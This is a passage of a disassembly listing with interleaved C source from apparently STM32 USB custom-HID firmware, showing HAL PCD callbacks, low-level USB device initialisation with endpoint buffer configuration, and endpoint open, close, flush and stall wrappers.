 800c92a:	f7fe fc43 	bl	800b1b4 <USBD_LL_DataInStage>
}
 800c92e:	bf00      	nop
 800c930:	3708      	adds	r7, #8
 800c932:	46bd      	mov	sp, r7
 800c934:	bd80      	pop	{r7, pc}

0800c936 <HAL_PCD_SOFCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c936:	b580      	push	{r7, lr}
 800c938:	b082      	sub	sp, #8
 800c93a:	af00      	add	r7, sp, #0
 800c93c:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800c93e:	687b      	ldr	r3, [r7, #4]
 800c940:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c944:	4618      	mov	r0, r3
 800c946:	f7fe fd7d 	bl	800b444 <USBD_LL_SOF>
}
 800c94a:	bf00      	nop
 800c94c:	3708      	adds	r7, #8
 800c94e:	46bd      	mov	sp, r7
 800c950:	bd80      	pop	{r7, pc}

0800c952 <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c952:	b580      	push	{r7, lr}
 800c954:	b084      	sub	sp, #16
 800c956:	af00      	add	r7, sp, #0
 800c958:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800c95a:	2301      	movs	r3, #1
 800c95c:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800c95e:	687b      	ldr	r3, [r7, #4]
 800c960:	689b      	ldr	r3, [r3, #8]
 800c962:	2b02      	cmp	r3, #2
 800c964:	d001      	beq.n	800c96a <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800c966:	f7f4 f985 	bl	8000c74 <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800c96a:	687b      	ldr	r3, [r7, #4]
 800c96c:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c970:	7bfa      	ldrb	r2, [r7, #15]
 800c972:	4611      	mov	r1, r2
 800c974:	4618      	mov	r0, r3
 800c976:	f7fe fd21 	bl	800b3bc <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800c97a:	687b      	ldr	r3, [r7, #4]
 800c97c:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c980:	4618      	mov	r0, r3
 800c982:	f7fe fcc9 	bl	800b318 <USBD_LL_Reset>
}
 800c986:	bf00      	nop
 800c988:	3710      	adds	r7, #16
 800c98a:	46bd      	mov	sp, r7
 800c98c:	bd80      	pop	{r7, pc}
	...

0800c990 <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c990:	b580      	push	{r7, lr}
 800c992:	b082      	sub	sp, #8
 800c994:	af00      	add	r7, sp, #0
 800c996:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800c998:	687b      	ldr	r3, [r7, #4]
 800c99a:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c99e:	4618      	mov	r0, r3
 800c9a0:	f7fe fd1c 	bl	800b3dc <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800c9a4:	687b      	ldr	r3, [r7, #4]
 800c9a6:	699b      	ldr	r3, [r3, #24]
 800c9a8:	2b00      	cmp	r3, #0
 800c9aa:	d005      	beq.n	800c9b8 <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800c9ac:	4b04      	ldr	r3, [pc, #16]	; (800c9c0 <HAL_PCD_SuspendCallback+0x30>)
 800c9ae:	691b      	ldr	r3, [r3, #16]
 800c9b0:	4a03      	ldr	r2, [pc, #12]	; (800c9c0 <HAL_PCD_SuspendCallback+0x30>)
 800c9b2:	f043 0306 	orr.w	r3, r3, #6
 800c9b6:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800c9b8:	bf00      	nop
 800c9ba:	3708      	adds	r7, #8
 800c9bc:	46bd      	mov	sp, r7
 800c9be:	bd80      	pop	{r7, pc}
 800c9c0:	e000ed00 	.word	0xe000ed00

0800c9c4 <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c9c4:	b580      	push	{r7, lr}
 800c9c6:	b082      	sub	sp, #8
 800c9c8:	af00      	add	r7, sp, #0
 800c9ca:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800c9cc:	687b      	ldr	r3, [r7, #4]
 800c9ce:	699b      	ldr	r3, [r3, #24]
 800c9d0:	2b00      	cmp	r3, #0
 800c9d2:	d007      	beq.n	800c9e4 <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800c9d4:	4b08      	ldr	r3, [pc, #32]	; (800c9f8 <HAL_PCD_ResumeCallback+0x34>)
 800c9d6:	691b      	ldr	r3, [r3, #16]
 800c9d8:	4a07      	ldr	r2, [pc, #28]	; (800c9f8 <HAL_PCD_ResumeCallback+0x34>)
 800c9da:	f023 0306 	bic.w	r3, r3, #6
 800c9de:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800c9e0:	f000 faf0 	bl	800cfc4 <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800c9e4:	687b      	ldr	r3, [r7, #4]
 800c9e6:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9ea:	4618      	mov	r0, r3
 800c9ec:	f7fe fd12 	bl	800b414 <USBD_LL_Resume>
}
 800c9f0:	bf00      	nop
 800c9f2:	3708      	adds	r7, #8
 800c9f4:	46bd      	mov	sp, r7
 800c9f6:	bd80      	pop	{r7, pc}
 800c9f8:	e000ed00 	.word	0xe000ed00

0800c9fc <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800c9fc:	b580      	push	{r7, lr}
 800c9fe:	b082      	sub	sp, #8
 800ca00:	af00      	add	r7, sp, #0
 800ca02:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800ca04:	f7f6 ff42 	bl	800388c <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800ca08:	4a26      	ldr	r2, [pc, #152]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca0a:	687b      	ldr	r3, [r7, #4]
 800ca0c:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800ca10:	687b      	ldr	r3, [r7, #4]
 800ca12:	4a24      	ldr	r2, [pc, #144]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca14:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800ca18:	4b22      	ldr	r3, [pc, #136]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca1a:	4a23      	ldr	r2, [pc, #140]	; (800caa8 <USBD_LL_Init+0xac>)
 800ca1c:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800ca1e:	4b21      	ldr	r3, [pc, #132]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca20:	2208      	movs	r2, #8
 800ca22:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800ca24:	4b1f      	ldr	r3, [pc, #124]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca26:	2202      	movs	r2, #2
 800ca28:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800ca2a:	4b1e      	ldr	r3, [pc, #120]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca2c:	2202      	movs	r2, #2
 800ca2e:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800ca30:	4b1c      	ldr	r3, [pc, #112]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca32:	2200      	movs	r2, #0
 800ca34:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800ca36:	4b1b      	ldr	r3, [pc, #108]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca38:	2200      	movs	r2, #0
 800ca3a:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800ca3c:	4b19      	ldr	r3, [pc, #100]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca3e:	2200      	movs	r2, #0
 800ca40:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800ca42:	4b18      	ldr	r3, [pc, #96]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca44:	2200      	movs	r2, #0
 800ca46:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800ca48:	4816      	ldr	r0, [pc, #88]	; (800caa4 <USBD_LL_Init+0xa8>)
 800ca4a:	f7f5 f8e7 	bl	8001c1c <HAL_PCD_Init>
 800ca4e:	4603      	mov	r3, r0
 800ca50:	2b00      	cmp	r3, #0
 800ca52:	d001      	beq.n	800ca58 <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800ca54:	f7f4 f90e 	bl	8000c74 <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800ca58:	687b      	ldr	r3, [r7, #4]
 800ca5a:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca5e:	2318      	movs	r3, #24
 800ca60:	2200      	movs	r2, #0
 800ca62:	2100      	movs	r1, #0
 800ca64:	f7f6 fe31 	bl	80036ca <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800ca68:	687b      	ldr	r3, [r7, #4]
 800ca6a:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca6e:	2358      	movs	r3, #88	; 0x58
 800ca70:	2200      	movs	r2, #0
 800ca72:	2180      	movs	r1, #128	; 0x80
 800ca74:	f7f6 fe29 	bl	80036ca <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800ca78:	687b      	ldr	r3, [r7, #4]
 800ca7a:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca7e:	2398      	movs	r3, #152	; 0x98
 800ca80:	2200      	movs	r2, #0
 800ca82:	2181      	movs	r1, #129	; 0x81
 800ca84:	f7f6 fe21 	bl	80036ca <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800ca88:	687b      	ldr	r3, [r7, #4]
 800ca8a:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca8e:	23d8      	movs	r3, #216	; 0xd8
 800ca90:	2200      	movs	r2, #0
 800ca92:	2101      	movs	r1, #1
 800ca94:	f7f6 fe19 	bl	80036ca <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800ca98:	2300      	movs	r3, #0
}
 800ca9a:	4618      	mov	r0, r3
 800ca9c:	3708      	adds	r7, #8
 800ca9e:	46bd      	mov	sp, r7
 800caa0:	bd80      	pop	{r7, pc}
 800caa2:	bf00      	nop
 800caa4:	20000b7c 	.word	0x20000b7c
 800caa8:	40006800 	.word	0x40006800

0800caac <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800caac:	b580      	push	{r7, lr}
 800caae:	b084      	sub	sp, #16
 800cab0:	af00      	add	r7, sp, #0
 800cab2:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cab4:	2300      	movs	r3, #0
 800cab6:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cab8:	2300      	movs	r3, #0
 800caba:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_Start(pdev->pData);
 800cabc:	687b      	ldr	r3, [r7, #4]
 800cabe:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cac2:	4618      	mov	r0, r3
 800cac4:	f7f5 f9b0 	bl	8001e28 <HAL_PCD_Start>
 800cac8:	4603      	mov	r3, r0
 800caca:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cacc:	7bbb      	ldrb	r3, [r7, #14]
 800cace:	2b03      	cmp	r3, #3
 800cad0:	d816      	bhi.n	800cb00 <USBD_LL_Start+0x54>
 800cad2:	a201      	add	r2, pc, #4	; (adr r2, 800cad8 <USBD_LL_Start+0x2c>)
 800cad4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cad8:	0800cae9 	.word	0x0800cae9
 800cadc:	0800caef 	.word	0x0800caef
 800cae0:	0800caf5 	.word	0x0800caf5
 800cae4:	0800cafb 	.word	0x0800cafb
    case HAL_OK :
      usb_status = USBD_OK;
 800cae8:	2300      	movs	r3, #0
 800caea:	73fb      	strb	r3, [r7, #15]
    break;
 800caec:	e00b      	b.n	800cb06 <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800caee:	2303      	movs	r3, #3
 800caf0:	73fb      	strb	r3, [r7, #15]
    break;
 800caf2:	e008      	b.n	800cb06 <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800caf4:	2301      	movs	r3, #1
 800caf6:	73fb      	strb	r3, [r7, #15]
    break;
 800caf8:	e005      	b.n	800cb06 <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cafa:	2303      	movs	r3, #3
 800cafc:	73fb      	strb	r3, [r7, #15]
    break;
 800cafe:	e002      	b.n	800cb06 <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800cb00:	2303      	movs	r3, #3
 800cb02:	73fb      	strb	r3, [r7, #15]
    break;
 800cb04:	bf00      	nop
  }
  return usb_status;
 800cb06:	7bfb      	ldrb	r3, [r7, #15]
}
 800cb08:	4618      	mov	r0, r3
 800cb0a:	3710      	adds	r7, #16
 800cb0c:	46bd      	mov	sp, r7
 800cb0e:	bd80      	pop	{r7, pc}

0800cb10 <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800cb10:	b580      	push	{r7, lr}
 800cb12:	b084      	sub	sp, #16
 800cb14:	af00      	add	r7, sp, #0
 800cb16:	6078      	str	r0, [r7, #4]
 800cb18:	4608      	mov	r0, r1
 800cb1a:	4611      	mov	r1, r2
 800cb1c:	461a      	mov	r2, r3
 800cb1e:	4603      	mov	r3, r0
 800cb20:	70fb      	strb	r3, [r7, #3]
 800cb22:	460b      	mov	r3, r1
 800cb24:	70bb      	strb	r3, [r7, #2]
 800cb26:	4613      	mov	r3, r2
 800cb28:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb2a:	2300      	movs	r3, #0
 800cb2c:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb2e:	2300      	movs	r3, #0
 800cb30:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800cb32:	687b      	ldr	r3, [r7, #4]
 800cb34:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cb38:	78bb      	ldrb	r3, [r7, #2]
 800cb3a:	883a      	ldrh	r2, [r7, #0]
 800cb3c:	78f9      	ldrb	r1, [r7, #3]
 800cb3e:	f7f5 fae1 	bl	8002104 <HAL_PCD_EP_Open>
 800cb42:	4603      	mov	r3, r0
 800cb44:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cb46:	7bbb      	ldrb	r3, [r7, #14]
 800cb48:	2b03      	cmp	r3, #3
 800cb4a:	d817      	bhi.n	800cb7c <USBD_LL_OpenEP+0x6c>
 800cb4c:	a201      	add	r2, pc, #4	; (adr r2, 800cb54 <USBD_LL_OpenEP+0x44>)
 800cb4e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cb52:	bf00      	nop
 800cb54:	0800cb65 	.word	0x0800cb65
 800cb58:	0800cb6b 	.word	0x0800cb6b
 800cb5c:	0800cb71 	.word	0x0800cb71
 800cb60:	0800cb77 	.word	0x0800cb77
    case HAL_OK :
      usb_status = USBD_OK;
 800cb64:	2300      	movs	r3, #0
 800cb66:	73fb      	strb	r3, [r7, #15]
    break;
 800cb68:	e00b      	b.n	800cb82 <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cb6a:	2303      	movs	r3, #3
 800cb6c:	73fb      	strb	r3, [r7, #15]
    break;
 800cb6e:	e008      	b.n	800cb82 <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cb70:	2301      	movs	r3, #1
 800cb72:	73fb      	strb	r3, [r7, #15]
    break;
 800cb74:	e005      	b.n	800cb82 <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cb76:	2303      	movs	r3, #3
 800cb78:	73fb      	strb	r3, [r7, #15]
    break;
 800cb7a:	e002      	b.n	800cb82 <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800cb7c:	2303      	movs	r3, #3
 800cb7e:	73fb      	strb	r3, [r7, #15]
    break;
 800cb80:	bf00      	nop
  }
  return usb_status;
 800cb82:	7bfb      	ldrb	r3, [r7, #15]
}
 800cb84:	4618      	mov	r0, r3
 800cb86:	3710      	adds	r7, #16
 800cb88:	46bd      	mov	sp, r7
 800cb8a:	bd80      	pop	{r7, pc}

0800cb8c <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cb8c:	b580      	push	{r7, lr}
 800cb8e:	b084      	sub	sp, #16
 800cb90:	af00      	add	r7, sp, #0
 800cb92:	6078      	str	r0, [r7, #4]
 800cb94:	460b      	mov	r3, r1
 800cb96:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb98:	2300      	movs	r3, #0
 800cb9a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb9c:	2300      	movs	r3, #0
 800cb9e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800cba0:	687b      	ldr	r3, [r7, #4]
 800cba2:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cba6:	78fa      	ldrb	r2, [r7, #3]
 800cba8:	4611      	mov	r1, r2
 800cbaa:	4618      	mov	r0, r3
 800cbac:	f7f5 fb07 	bl	80021be <HAL_PCD_EP_Close>
 800cbb0:	4603      	mov	r3, r0
 800cbb2:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cbb4:	7bbb      	ldrb	r3, [r7, #14]
 800cbb6:	2b03      	cmp	r3, #3
 800cbb8:	d816      	bhi.n	800cbe8 <USBD_LL_CloseEP+0x5c>
 800cbba:	a201      	add	r2, pc, #4	; (adr r2, 800cbc0 <USBD_LL_CloseEP+0x34>)
 800cbbc:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cbc0:	0800cbd1 	.word	0x0800cbd1
 800cbc4:	0800cbd7 	.word	0x0800cbd7
 800cbc8:	0800cbdd 	.word	0x0800cbdd
 800cbcc:	0800cbe3 	.word	0x0800cbe3
    case HAL_OK :
      usb_status = USBD_OK;
 800cbd0:	2300      	movs	r3, #0
 800cbd2:	73fb      	strb	r3, [r7, #15]
    break;
 800cbd4:	e00b      	b.n	800cbee <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cbd6:	2303      	movs	r3, #3
 800cbd8:	73fb      	strb	r3, [r7, #15]
    break;
 800cbda:	e008      	b.n	800cbee <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cbdc:	2301      	movs	r3, #1
 800cbde:	73fb      	strb	r3, [r7, #15]
    break;
 800cbe0:	e005      	b.n	800cbee <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cbe2:	2303      	movs	r3, #3
 800cbe4:	73fb      	strb	r3, [r7, #15]
    break;
 800cbe6:	e002      	b.n	800cbee <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cbe8:	2303      	movs	r3, #3
 800cbea:	73fb      	strb	r3, [r7, #15]
    break;
 800cbec:	bf00      	nop
  }
  return usb_status;
 800cbee:	7bfb      	ldrb	r3, [r7, #15]
}
 800cbf0:	4618      	mov	r0, r3
 800cbf2:	3710      	adds	r7, #16
 800cbf4:	46bd      	mov	sp, r7
 800cbf6:	bd80      	pop	{r7, pc}

0800cbf8 <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cbf8:	b580      	push	{r7, lr}
 800cbfa:	b084      	sub	sp, #16
 800cbfc:	af00      	add	r7, sp, #0
 800cbfe:	6078      	str	r0, [r7, #4]
 800cc00:	460b      	mov	r3, r1
 800cc02:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc04:	2300      	movs	r3, #0
 800cc06:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc08:	2300      	movs	r3, #0
 800cc0a:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800cc0c:	687b      	ldr	r3, [r7, #4]
 800cc0e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc12:	78fa      	ldrb	r2, [r7, #3]
 800cc14:	4611      	mov	r1, r2
 800cc16:	4618      	mov	r0, r3
 800cc18:	f7f5 fc66 	bl	80024e8 <HAL_PCD_EP_Flush>
 800cc1c:	4603      	mov	r3, r0
 800cc1e:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc20:	7bbb      	ldrb	r3, [r7, #14]
 800cc22:	2b03      	cmp	r3, #3
 800cc24:	d816      	bhi.n	800cc54 <USBD_LL_FlushEP+0x5c>
 800cc26:	a201      	add	r2, pc, #4	; (adr r2, 800cc2c <USBD_LL_FlushEP+0x34>)
 800cc28:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc2c:	0800cc3d 	.word	0x0800cc3d
 800cc30:	0800cc43 	.word	0x0800cc43
 800cc34:	0800cc49 	.word	0x0800cc49
 800cc38:	0800cc4f 	.word	0x0800cc4f
    case HAL_OK :
      usb_status = USBD_OK;
 800cc3c:	2300      	movs	r3, #0
 800cc3e:	73fb      	strb	r3, [r7, #15]
    break;
 800cc40:	e00b      	b.n	800cc5a <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cc42:	2303      	movs	r3, #3
 800cc44:	73fb      	strb	r3, [r7, #15]
    break;
 800cc46:	e008      	b.n	800cc5a <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cc48:	2301      	movs	r3, #1
 800cc4a:	73fb      	strb	r3, [r7, #15]
    break;
 800cc4c:	e005      	b.n	800cc5a <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cc4e:	2303      	movs	r3, #3
 800cc50:	73fb      	strb	r3, [r7, #15]
    break;
 800cc52:	e002      	b.n	800cc5a <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cc54:	2303      	movs	r3, #3
 800cc56:	73fb      	strb	r3, [r7, #15]
    break;
 800cc58:	bf00      	nop
  }
  return usb_status;
 800cc5a:	7bfb      	ldrb	r3, [r7, #15]
}
 800cc5c:	4618      	mov	r0, r3
 800cc5e:	3710      	adds	r7, #16
 800cc60:	46bd      	mov	sp, r7
 800cc62:	bd80      	pop	{r7, pc}

0800cc64 <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cc64:	b580      	push	{r7, lr}
 800cc66:	b084      	sub	sp, #16
 800cc68:	af00      	add	r7, sp, #0
 800cc6a:	6078      	str	r0, [r7, #4]
 800cc6c:	460b      	mov	r3, r1
 800cc6e:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc70:	2300      	movs	r3, #0
 800cc72:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc74:	2300      	movs	r3, #0
 800cc76:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800cc78:	687b      	ldr	r3, [r7, #4]
 800cc7a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc7e:	78fa      	ldrb	r2, [r7, #3]
 800cc80:	4611      	mov	r1, r2
 800cc82:	4618      	mov	r0, r3
 800cc84:	f7f5 fb7c 	bl	8002380 <HAL_PCD_EP_SetStall>
 800cc88:	4603      	mov	r3, r0
 800cc8a:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc8c:	7bbb      	ldrb	r3, [r7, #14]
 800cc8e:	2b03      	cmp	r3, #3
 800cc90:	d816      	bhi.n	800ccc0 <USBD_LL_StallEP+0x5c>
 800cc92:	a201      	add	r2, pc, #4	; (adr r2, 800cc98 <USBD_LL_StallEP+0x34>)
 800cc94:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc98:	0800cca9 	.word	0x0800cca9
 800cc9c:	0800ccaf 	.word	0x0800ccaf
 800cca0:	0800ccb5 	.word	0x0800ccb5
 800cca4:	0800ccbb 	.word	0x0800ccbb
    case HAL_OK :
      usb_status = USBD_OK;
 800cca8:	2300      	movs	r3, #0
 800ccaa:	73fb      	strb	r3, [r7, #15]
    break;
 800ccac:	e00b      	b.n	800ccc6 <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ccae:	2303      	movs	r3, #3
 800ccb0:	73fb      	strb	r3, [r7, #15]
    break;
 800ccb2:	e008      	b.n	800ccc6 <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
